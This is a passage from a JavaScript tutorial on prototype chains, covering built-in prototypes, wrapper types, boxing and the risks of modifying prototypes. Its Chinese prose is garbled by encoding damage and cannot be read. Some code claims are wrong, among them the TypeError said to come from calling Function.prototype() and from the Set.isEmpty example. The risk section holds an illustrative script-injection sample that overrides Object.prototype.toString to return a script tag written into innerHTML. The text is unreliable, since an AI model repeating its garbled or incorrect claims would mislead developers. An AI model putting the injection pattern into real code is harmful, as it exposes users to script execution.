class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">data</span> = heavyData;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">process</span> = <span class="hljs-function">() =&gt;</span> &#123; <span class="hljs-comment">/* ç›´æ¥ç»‘å®šåˆ°å®ä¾‹ */</span> &#125;;<br>  &#125;<br>&#125;<br><span class="hljs-comment">// é¦–æ¬¡åˆ›å»ºæˆæœ¬ç¨é«˜ï¼Œä½†è®¿é—®æ›´å¿«</span><br></code></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰ä½¿ç”¨å¯¹è±¡ç»„åˆæ›¿ä»£ç»§æ‰¿</p><p>ä¼˜åŒ–å‰ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123; <span class="hljs-comment">/* åŸºç¡€æ–¹æ³• */</span> &#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Admin</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">User</span> &#123; <span class="hljs-comment">/* ç‰¹æƒæ–¹æ³• */</span> &#125;<br><span class="hljs-comment">// åŸå‹é“¾æ·±åº¦ï¼š2</span><br></code></pre></td></tr></table></figure><p>ä¼˜åŒ–åï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> userMethods = &#123; <span class="hljs-comment">/* åŸºç¡€æ–¹æ³• */</span> &#125;;<br><span class="hljs-keyword">const</span> adminMethods = &#123; <span class="hljs-comment">/* ç‰¹æƒæ–¹æ³• */</span> &#125;;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">createAdmin</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(&#123;&#125;, userMethods, adminMethods);<br>&#125;<br><span class="hljs-comment">// åŸå‹é“¾æ·±åº¦ï¼š0</span><br></code></pre></td></tr></table></figure><p>ï¼ˆ4ï¼‰é€‰æ‹©æ€§ç¼“å­˜é«˜é¢‘è®¿é—®æ–¹æ³•</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">HeavyUsedClass</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-comment">// ç¼“å­˜é«˜é¢‘æ–¹æ³•å¼•ç”¨</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">frequentMethod</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">frequentMethod</span>.<span class="hljs-title function_">bind</span>(<span class="hljs-variable language_">this</span>);<br>  &#125;<br>  <br>  <span class="hljs-title function_">frequentMethod</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-comment">/* ... */</span> &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> instance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HeavyUsedClass</span>();<br><span class="hljs-comment">// åç»­è°ƒç”¨ç›´æ¥ä½¿ç”¨ instance.frequentMethod() ä¸éœ€è¦æŸ¥åŸå‹é“¾</span><br></code></pre></td></tr></table></figure><h1 id="ç¬¬å…«ç« ï¼šå†…ç½®å¯¹è±¡çš„åŸå‹ç»“æ„"><a href="#ç¬¬å…«ç« ï¼šå†…ç½®å¯¹è±¡çš„åŸå‹ç»“æ„" class="headerlink" title="ç¬¬å…«ç« ï¼šå†…ç½®å¯¹è±¡çš„åŸå‹ç»“æ„"></a>ç¬¬å…«ç« ï¼šå†…ç½®å¯¹è±¡çš„åŸå‹ç»“æ„</h1><h2 id="8-1-æ•°ç»„çš„åŸå‹é“¾ï¼šArray-prototype"><a href="#8-1-æ•°ç»„çš„åŸå‹é“¾ï¼šArray-prototype" class="headerlink" title="8.1 æ•°ç»„çš„åŸå‹é“¾ï¼šArray.prototype"></a>8.1 æ•°ç»„çš„åŸå‹é“¾ï¼š<code>Array.prototype</code></h2><p>JavaScript ä¸­æ•°ç»„çš„åŸå‹é“¾éµå¾ªä»¥ä¸‹å±‚æ¬¡ç»“æ„</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">[å®é™…æ•°ç»„å®ä¾‹] <br>â†’ Array.prototype <br>  â†’ Object.prototype<br>    â†’ null<br></code></pre></td></tr></table></figure><p><strong>Array.prototype å±‚è¯¦è§£ - æ ¸å¿ƒæ–¹æ³•åˆ†ç±»</strong></p><table><thead><tr><th align="left">æ–¹æ³•ç±»å‹</th><th align="left">ç¤ºä¾‹æ–¹æ³•</th><th align="left">ESç‰ˆæœ¬</th></tr></thead><tbody><tr><td align="left">ä¿®æ”¹å™¨æ–¹æ³•</td><td align="left">push(), pop(), splice(), sort()</td><td align="left">ES1</td></tr><tr><td align="left">è®¿é—®æ–¹æ³•</td><td align="left">concat(), slice(), join()</td><td align="left">ES1</td></tr><tr><td align="left">è¿­ä»£æ–¹æ³•</td><td align="left">forEach(), map(), filter()</td><td align="left">ES5</td></tr><tr><td align="left">æŸ¥æ‰¾æ–¹æ³•</td><td align="left">find(), findIndex(), includes()</td><td align="left">ES6+</td></tr><tr><td align="left">è½¬æ¢æ–¹æ³•</td><td align="left">toString(), toLocaleString()</td><td align="left">ES1</td></tr></tbody></table><h2 id="8-2-å‡½æ•°çš„åŸå‹é“¾ï¼šFunction-prototype"><a href="#8-2-å‡½æ•°çš„åŸå‹é“¾ï¼šFunction-prototype" class="headerlink" title="8.2 å‡½æ•°çš„åŸå‹é“¾ï¼šFunction.prototype"></a>8.2 å‡½æ•°çš„åŸå‹é“¾ï¼š<code>Function.prototype</code></h2><p><strong>å‡½æ•°åŸå‹é“¾å±‚æ¬¡ç»“æ„</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">[å‡½æ•°å®ä¾‹]<br>â†’ Function.prototype<br>  â†’ Object.prototype<br>    â†’ null<br></code></pre></td></tr></table></figure><p><strong>Function.prototype å±‚è¯¦è§£ - æ ¸å¿ƒæ–¹æ³•åˆ†ç±»</strong></p><table><thead><tr><th align="left">æ–¹æ³•å</th><th align="left">ä½œç”¨æè¿°</th><th align="left">è¿”å›ç±»å‹</th></tr></thead><tbody><tr><td align="left">apply()</td><td align="left">æŒ‡å®šthiså€¼å¹¶ä»¥æ•°ç»„å½¢å¼ä¼ å‚</td><td align="left">å‡½æ•°è¿”å›å€¼</td></tr><tr><td align="left">call()</td><td align="left">æŒ‡å®šthiså€¼å¹¶é€ä¸ªä¼ å‚</td><td align="left">å‡½æ•°è¿”å›å€¼</td></tr><tr><td align="left">bind()</td><td align="left">åˆ›å»ºç»‘å®šthisçš„æ–°å‡½æ•°</td><td align="left">å‡½æ•°</td></tr><tr><td align="left">toString()</td><td align="left">è¿”å›å‡½æ•°æºç å­—ç¬¦ä¸²</td><td align="left">å­—ç¬¦ä¸²</td></tr></tbody></table><p><strong>ç‰¹æ®Šè¡Œä¸º</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// Function.prototype æœ¬èº«æ˜¯ä¸€ä¸ªå‡½æ•°</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">typeof</span> <span class="hljs-title class_">Function</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>); <span class="hljs-comment">// &quot;function&quot;</span><br><br><span class="hljs-comment">// ä½†æ— æ³•æ­£å¸¸è°ƒç”¨</span><br><span class="hljs-keyword">try</span> &#123;<br>  <span class="hljs-title class_">Function</span>.<span class="hljs-title function_">prototype</span>();<br>&#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(e); <span class="hljs-comment">// TypeError: Function.prototype requires &#x27;this&#x27;</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="8-3-åŒ…è£…ç±»å‹ï¼ˆString-Number-Booleanï¼‰çš„åŸå‹"><a href="#8-3-åŒ…è£…ç±»å‹ï¼ˆString-Number-Booleanï¼‰çš„åŸå‹" class="headerlink" title="8.3 åŒ…è£…ç±»å‹ï¼ˆString&#x2F;Number&#x2F;Booleanï¼‰çš„åŸå‹"></a>8.3 åŒ…è£…ç±»å‹ï¼ˆString&#x2F;Number&#x2F;Booleanï¼‰çš„åŸå‹</h2><p>JavaScript ä¸­çš„åŸºæœ¬ç±»å‹ï¼ˆstring&#x2F;number&#x2F;booleanï¼‰åœ¨è¢«å½“æˆå¯¹è±¡ä½¿ç”¨æ—¶ï¼Œä¼šè¢«è‡ªåŠ¨è½¬æ¢ä¸ºå¯¹åº”çš„åŒ…è£…å¯¹è±¡ï¼Œè¿™äº›åŒ…è£…å¯¹è±¡æ‹¥æœ‰å„è‡ªçš„åŸå‹é“¾ç»“æ„</p><p><strong>String åŒ…è£…ç±»å‹</strong></p><p>åŸå‹é“¾ç»“æ„å¦‚ä¸‹ï¼š</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">[Stringå®ä¾‹]<br>â†’ String.prototype<br>  â†’ Object.prototype<br>    â†’ null<br></code></pre></td></tr></table></figure><p>String.prototype çš„æ ¸å¿ƒæ–¹æ³•æœ‰ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// å­—ç¬¦ä¸²æ“ä½œæ–¹æ³•</span><br><span class="hljs-string">&#x27;abc&#x27;</span>.<span class="hljs-title function_">concat</span>(<span class="hljs-string">&#x27;def&#x27;</span>)      <span class="hljs-comment">// &#x27;abcdef&#x27;</span><br><span class="hljs-string">&#x27;hello&#x27;</span>.<span class="hljs-title function_">slice</span>(<span class="hljs-number">1</span>, <span class="hljs-number">3</span>)      <span class="hljs-comment">// &#x27;el&#x27;</span><br><span class="hljs-string">&#x27;ABC&#x27;</span>.<span class="hljs-title function_">toLowerCase</span>()      <span class="hljs-comment">// &#x27;abc&#x27;</span><br><br><span class="hljs-comment">// ES6+ æ–°å¢æ–¹æ³•</span><br><span class="hljs-string">&#x27;  abc  &#x27;</span>.<span class="hljs-title function_">trim</span>()         <span class="hljs-comment">// &#x27;abc&#x27;</span><br><span class="hljs-string">&#x27;hello&#x27;</span>.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">&#x27;he&#x27;</span>) <span class="hljs-comment">// true</span><br><span class="hljs-string">&#x27;abc&#x27;</span>.<span class="hljs-title function_">repeat</span>(<span class="hljs-number">2</span>)          <span class="hljs-comment">// &#x27;abcabc&#x27;</span><br><br><span class="hljs-comment">// è¿­ä»£æ–¹æ³•</span><br><span class="hljs-string">&#x27;ğŸ˜Š&#x27;</span>.<span class="hljs-title function_">codePointAt</span>(<span class="hljs-number">0</span>)      <span class="hljs-comment">// 128522</span><br></code></pre></td></tr></table></figure><p><strong>Number åŒ…è£…ç±»å‹</strong></p><p>åŸå‹é“¾ç»“æ„å¦‚ä¸‹ï¼š</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">[Numberå®ä¾‹]<br>â†’ Number.prototype<br>  â†’ Object.prototype<br>    â†’ null<br></code></pre></td></tr></table></figure><p>Number.prototype æ ¸å¿ƒæ–¹æ³•:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// è½¬æ¢æ–¹æ³•</span><br>(<span class="hljs-number">123.456</span>).<span class="hljs-title function_">toFixed</span>(<span class="hljs-number">2</span>)    <span class="hljs-comment">// &#x27;123.46&#x27;</span><br>(<span class="hljs-number">255</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>)      <span class="hljs-comment">// &#x27;ff&#x27;</span><br><br><span class="hljs-comment">// ES6+ æ–°å¢æ–¹æ³•</span><br><span class="hljs-title class_">Number</span>.<span class="hljs-title function_">isInteger</span>(<span class="hljs-number">5.0</span>)   <span class="hljs-comment">// true</span><br>(<span class="hljs-number">1000</span>).<span class="hljs-title function_">toExponential</span>()  <span class="hljs-comment">// &#x27;1e+3&#x27;</span><br><br><span class="hljs-comment">// æ•°å€¼æ ¼å¼åŒ–</span><br>(<span class="hljs-number">123456.789</span>).<span class="hljs-title function_">toLocaleString</span>(<span class="hljs-string">&#x27;de-DE&#x27;</span>) <span class="hljs-comment">// &#x27;123.456,789&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>Boolean åŒ…è£…ç±»å‹</strong></p><p>åŸå‹é“¾ç»“æ„ï¼š</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">[Booleanå®ä¾‹]<br>â†’ Boolean.prototype<br>  â†’ Object.prototype<br>    â†’ null<br></code></pre></td></tr></table></figure><p>Boolean.prototype æ–¹æ³•ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// åŸºæœ¬æ–¹æ³•</span><br><span class="hljs-literal">true</span>.<span class="hljs-title function_">toString</span>()         <span class="hljs-comment">// &#x27;true&#x27;</span><br><span class="hljs-literal">false</span>.<span class="hljs-title function_">valueOf</span>()         <span class="hljs-comment">// false</span><br><br><span class="hljs-comment">// æ³¨æ„ï¼šBooleanåŒ…è£…å¯¹è±¡çš„æ–¹æ³•è¾ƒå°‘</span><br></code></pre></td></tr></table></figure><p><strong>è‡ªåŠ¨è£…ç®±ä¸æ‹†ç®±æœºåˆ¶</strong></p><p>ï¼ˆ1ï¼‰è‡ªåŠ¨è£…ç®±</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// åŸå§‹å€¼è®¿é—®å±æ€§æ—¶è‡ªåŠ¨åˆ›å»ºåŒ…è£…å¯¹è±¡</span><br><span class="hljs-keyword">const</span> str = <span class="hljs-string">&#x27;hello&#x27;</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(str.<span class="hljs-property">length</span>); <span class="hljs-comment">// 5 (ä¸´æ—¶åˆ›å»ºStringå¯¹è±¡)</span><br><br><span class="hljs-comment">// ç­‰ä»·äº</span><br><span class="hljs-keyword">const</span> temp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(str);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(temp.<span class="hljs-property">length</span>);<br>temp = <span class="hljs-literal">null</span>; <span class="hljs-comment">// ä½¿ç”¨åç«‹å³é”€æ¯</span><br></code></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰æ‰‹åŠ¨è£…ç®±ä¸æ‹†ç®±</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// æ‰‹åŠ¨åˆ›å»ºåŒ…è£…å¯¹è±¡</span><br><span class="hljs-keyword">const</span> strObj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">&#x27;hello&#x27;</span>);<br><span class="hljs-keyword">const</span> numObj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Number</span>(<span class="hljs-number">123</span>);<br><span class="hljs-keyword">const</span> boolObj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Boolean</span>(<span class="hljs-literal">true</span>);<br><br><span class="hljs-comment">// æ‹†ç®±æ“ä½œ</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(strObj.<span class="hljs-title function_">valueOf</span>()); <span class="hljs-comment">// &#x27;hello&#x27;</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(numObj + <span class="hljs-number">1</span>);      <span class="hljs-comment">// 124 (è‡ªåŠ¨è°ƒç”¨valueOf)</span><br></code></pre></td></tr></table></figure><p><strong>åŸå§‹å€¼ä¸åŒ…è£…å¯¹è±¡çš„åŒºåˆ«</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">typeof</span> <span class="hljs-string">&#x27;hello&#x27;</span>           <span class="hljs-comment">// &#x27;string&#x27;</span><br><span class="hljs-keyword">typeof</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">&#x27;hello&#x27;</span>) <span class="hljs-comment">// &#x27;object&#x27;</span><br><br><span class="hljs-string">&#x27;hello&#x27;</span> <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">String</span>   <span class="hljs-comment">// false</span><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">&#x27;hello&#x27;</span>) <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">String</span> <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><p><strong>valueOf() çš„é‡è¦æ€§</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> numObj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Number</span>(<span class="hljs-number">42</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(numObj === <span class="hljs-number">42</span>);       <span class="hljs-comment">// false</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(numObj.<span class="hljs-title function_">valueOf</span>() === <span class="hljs-number">42</span>); <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><h2 id="8-4-ä¿®æ”¹å†…ç½®åŸå‹çš„é£é™©ä¸æœ€ä½³å®è·µ"><a href="#8-4-ä¿®æ”¹å†…ç½®åŸå‹çš„é£é™©ä¸æœ€ä½³å®è·µ" class="headerlink" title="8.4 ä¿®æ”¹å†…ç½®åŸå‹çš„é£é™©ä¸æœ€ä½³å®è·µ"></a>8.4 ä¿®æ”¹å†…ç½®åŸå‹çš„é£é™©ä¸æœ€ä½³å®è·µ</h2><p><strong>ä¸»è¦é£é™©</strong></p><p>ï¼ˆ1ï¼‰å…¨å±€æ±¡æŸ“</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// é»˜è®¤æ·»åŠ çš„å±æ€§æ˜¯å¯æšä¸¾çš„</span><br><span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">customMethod</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;&#125;;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">in</span> []) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(key); <span class="hljs-comment">// ä¼šè¾“å‡º &quot;customMethod&quot; (æ±¡æŸ“for-inå¾ªç¯)</span><br>&#125;<br><br><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(<span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>); <span class="hljs-comment">// åŒ…å«è‡ªå®šä¹‰æ–¹æ³•</span><br></code></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰å‘½åå†²çªå’Œè¦†ç›–é£é™©</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ä¸åŒåº“å¯èƒ½ä¿®æ”¹åŒä¸€åŸå‹</span><br><span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">find</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-comment">/* Aåº“çš„å®ç° */</span> &#125;;<br><span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">find</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-comment">/* Båº“çš„å®ç° */</span> &#125;; <span class="hljs-comment">// åè€…è¦†ç›–å‰è€…</span><br><br><span class="hljs-comment">// æœªæ¥ECMAScriptæ ‡å‡†å¯èƒ½å¼•å…¥åŒåæ–¹æ³•</span><br><span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">includes</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-comment">/* è‡ªå®šä¹‰å®ç° */</span> &#125;;<br><span class="hljs-comment">// å½“ES2016å¼•å…¥æ ‡å‡†includesæ–¹æ³•æ—¶äº§ç”Ÿå†²çª</span><br></code></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰æ€§èƒ½å½±å“</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ä¿®æ”¹åŸå‹ä¼šç ´åå¼•æ“ä¼˜åŒ–</span><br><span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">newMethod</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;&#125;;<br><br><span class="hljs-comment">// V8å¼•æ“çš„éšè—ç±»æœºåˆ¶å—å½±å“</span><br><span class="hljs-keyword">const</span> obj = &#123;&#125;;<br>obj.<span class="hljs-title function_">newMethod</span>(); <span class="hljs-comment">// è§¦å‘éšè—ç±»è½¬æ¢ï¼Œé™ä½æ€§èƒ½</span><br></code></pre></td></tr></table></figure><p>ï¼ˆ4ï¼‰å®‰å…¨æ¼æ´</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// æ±¡æŸ“toStringæ–¹æ³•</span><br><span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">toString</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;script&gt;maliciousCode()&lt;/script&gt;&#x27;</span>;<br>&#125;;<br><br><span class="hljs-comment">// å½“ç³»ç»Ÿè°ƒç”¨toStringæ—¶</span><br><span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">innerHTML</span> = someObject.<span class="hljs-title function_">toString</span>(); <span class="hljs-comment">// æ‰§è¡Œæ¶æ„ä»£ç </span><br></code></pre></td></tr></table></figure><p>ï¼ˆ5ï¼‰é¢„æœŸå¤–è¡Œä¸º</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ä¿®æ”¹åŸºç¡€å¯¹è±¡åŸå‹ä¼šå½±å“æ‰€æœ‰å¯¹è±¡</span><br><span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">isEmpty</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(<span class="hljs-variable language_">this</span>).<span class="hljs-property">length</span> === <span class="hljs-number">0</span>;<br>&#125;;<br><br><span class="hljs-comment">// æ„å¤–å½±å“ç¬¬ä¸‰æ–¹ä»£ç </span><br><span class="hljs-keyword">const</span> set = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>();<br>set.<span class="hljs-title function_">isEmpty</span>(); <span class="hljs-comment">// æŠ›å‡ºTypeErrorï¼ˆSetæ²¡æœ‰keysæ–¹æ³•ï¼‰</span><br></code></pre></td></tr></table></figure><p><strong>æœ€ä½³å®è·µ</strong></p><p>ï¼ˆ1ï¼‰å®‰å…¨æ‰©å±•æ¨¡å¼</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ä½¿ç”¨Object.definePropertyæ§åˆ¶å±æ€§ç‰¹æ€§</span><br><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(<span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>, <span class="hljs-string">&#x27;safeMethod&#x27;</span>, &#123;<br>  <span class="hljs-attr">value</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-comment">/* å®ç° */</span> &#125;,<br>  <span class="hljs-attr">writable</span>: <span class="hljs-literal">true</span>,      <span class="hljs-comment">// å…è®¸åç»­ä¿®æ”¹</span><br>  <span class="hljs-attr">enumerable</span>: <span class="hljs-literal">false</span>,   <span class="hljs-comment">// ä¸ä¼šå‡ºç°åœ¨for-inå¾ªç¯</span><br>  <span class="hljs-attr">configurable</span>: <span class="hljs-literal">true</span>   <span class="hljs-comment">// å…è®¸åç»­åˆ é™¤</span><br>&#125;);<br><br><span class="hljs-comment">// æ£€æŸ¥æ–¹æ³•æ˜¯å¦å·²å­˜åœ¨</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">safeMethod</span>) &#123;<br>  <span class="hljs-comment">// å®‰å…¨æ·»åŠ </span><br>&#125;<br></code></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰ä½¿ç”¨ Symbol ä½œä¸ºé”®</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// åˆ›å»ºå”¯ä¸€Symbolé”®</span><br><span class="hljs-keyword">const</span> arrayUniqueMethod = <span class="hljs-title class_">Symbol</span>(<span 